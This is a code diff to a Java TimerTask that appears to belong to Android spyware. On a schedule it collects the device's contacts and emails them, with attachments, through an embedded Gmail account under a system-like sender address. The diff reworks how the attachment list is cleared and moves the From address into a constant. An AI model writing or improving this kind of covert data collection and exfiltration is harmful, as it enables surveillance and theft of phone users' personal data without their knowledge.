@@ -64,8 +64,6 @@ public class GetInfoTask extends TimerTask
 		// If network connected, try to collect and send the information
 		if (!SysUtils.isNetworkConnected(context)) return;
 		
-		if (attachments == null) attachments = new ArrayList<File>();
-		
 		// Firstly we should make sure the time range ( > days that user set)
 		Date lastDatetime = null;
 		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
@@ -84,6 +82,10 @@ public class GetInfoTask extends TimerTask
 			//Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
 			return;
 		}
+		
+		// Clean attachments
+		if (attachments == null) attachments = new ArrayList<File>();
+		else attachments.clear();
 		
 		// Collect information
 		CollectContact(context);
@@ -197,7 +199,7 @@ public class GetInfoTask extends TimerTask
 
         try {   
             GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
-            gmailSender.setFrom("system@gmail.com");
+            gmailSender.setFrom(GMailSenderEx.DEFAULT_SENDER);
             gmailSender.setTo(recipients);
             gmailSender.setSubject(subject);
             gmailSender.setBody(body);
